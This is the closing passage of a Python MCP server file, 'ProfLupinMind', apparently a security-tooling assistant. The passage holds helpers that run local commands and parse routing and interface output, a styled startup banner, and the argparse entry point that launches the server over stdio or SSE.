        if key in condition_text:
            return any(term in combined for term in terms)

    return False


def _run_local_command(command: list[str]) -> str:
    try:
        result = subprocess.run(
            command,
            check=False,
            capture_output=True,
            text=True,
            timeout=5,
        )
    except Exception as exc:
        return f"ERROR: {exc}"
    output = result.stdout.strip()
    if result.stderr.strip():
        output = f"{output}\n{result.stderr.strip()}".strip()
    return output


def _parse_default_route(routes: str) -> dict[str, str]:
    for line in routes.splitlines():
        parts = line.split()
        if parts and parts[0] == "default":
            return {
                "gateway": parts[2] if len(parts) > 2 and parts[1] == "via" else "",
                "interface": _value_after(parts, "dev"),
                "source": _value_after(parts, "src"),
            }
    return {}


def _parse_connected_networks(routes: str) -> list[dict[str, str]]:
    networks = []
    for line in routes.splitlines():
        parts = line.split()
        if not parts or parts[0] == "default":
            continue
        if "/" not in parts[0]:
            continue
        networks.append({
            "network": parts[0],
            "interface": _value_after(parts, "dev"),
            "source": _value_after(parts, "src"),
        })
    return networks


def _parse_local_addresses(addresses: str) -> list[dict[str, str]]:
    if addresses.startswith("ERROR:") or "Operation not permitted" in addresses:
        return []
    parsed = []
    for line in addresses.splitlines():
        parts = line.split()
        if len(parts) < 3:
            continue
        parsed.append({
            "interface": parts[0],
            "state": parts[1],
            "addresses": " ".join(parts[2:]),
        })
    return parsed


def _parse_hostname_addresses(addresses: str) -> list[dict[str, str]]:
    if addresses.startswith("ERROR:") or "Operation not permitted" in addresses:
        return []
    values = [v for v in addresses.split() if v]
    if not values:
        return []
    return [{"interface": "unknown", "state": "UNKNOWN", "addresses": " ".join(values)}]


def _value_after(parts: list[str], marker: str) -> str:
    try:
        return parts[parts.index(marker) + 1]
    except (ValueError, IndexError):
        return ""


# ============================================================================
# ENTRY POINT
# ============================================================================

def _startup_card(transport: str, host: str, port: int) -> str:
    C   = ProfLupinMindVisualEngine.C
    R   = C['RESET']
    A   = C['NEON_CYAN']
    G   = C['MATRIX_GREEN']
    W   = C['BRIGHT_WHITE']
    GR  = C['TERMINAL_GRAY']
    Y   = C['CYBER_YELLOW']
    PU  = C['PURPLE']

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        hostname, local_ip = "unknown", "127.0.0.1"
    now = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")

    url = f"http://{host}:{port}/sse" if transport == "sse" else "stdio (subprocess)"

    card = ProfLupinMindVisualEngine.status_card(
        "LUPINMIND MCP SERVER — ONLINE",
        [
            ("⌁", "Transport", transport, A, W),
            ("◎", "Endpoint", url, A, W),
            ("▣", "Host", hostname, PU, W),
            ("⌖", "Local IP", local_ip, PU, Y),
            ("◷", "Started", now, GR, GR),
        ],
    )
    footer = (
        f"{GR}{'─' * ProfLupinMindVisualEngine.WIDTH}{R}\n"
        f"{ProfLupinMindVisualEngine._center(f'{G}▣{R} {W}AUTOMATE THE PROCESS.  ANALYZE THE RESULTS.  {C['KALI_RED']}OWN THE OUTCOME.{R}')}"
    )
    return f"\n{card}\n\n{footer}\n"


def main():
    parser = argparse.ArgumentParser(description="ProfLupinMind MCP server")
    parser.add_argument("--transport", default="stdio", choices=["stdio", "sse"])
    parser.add_argument("--host", default=_HOST)
    parser.add_argument("--port", type=int, default=_PORT)
    args = parser.parse_args()
    # stdio transport uses stdout as the MCP JSON channel. Keep Claude Code
    # startup quiet by default; set PROFLUPINMIND_SHOW_STDIO_BANNER=1 to see it.
    show_stdio_banner = os.environ.get("PROFLUPINMIND_SHOW_STDIO_BANNER", "").lower()
    quiet_stdio = args.transport == "stdio" and show_stdio_banner not in {"1", "true", "yes", "on"}
    if not quiet_stdio:
        command = f"python3 -u mcp_server.py --transport {args.transport}"
        if args.transport == "sse":
            command += f" --port {args.port}"
        if args.host != "127.0.0.1":
            command += f" --host {args.host}"
        banner = ProfLupinMindVisualEngine.banner(command=command)
        card = _startup_card(args.transport, args.host, args.port)
        startup_screen = f"{banner}\n{card}"
        if args.transport == "stdio":
            # Keep stdout reserved for MCP JSON while still showing/mirroring the
            # visual startup screen for terminal users.
            _tty(startup_screen)
        else:
            print(startup_screen)
            _mirror_raw_output(startup_screen)
        _ansi_re = _re.compile(r'\033\[[0-9;]*m')
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(_ansi_re.sub('', banner))
            f.write(_ansi_re.sub('', card))
    logger.info(f"🚀 ProfLupinMind MCP server starting | transport={args.transport} | {args.host}:{args.port}")
    mcp.run(transport=args.transport)


if __name__ == "__main__":
    main()
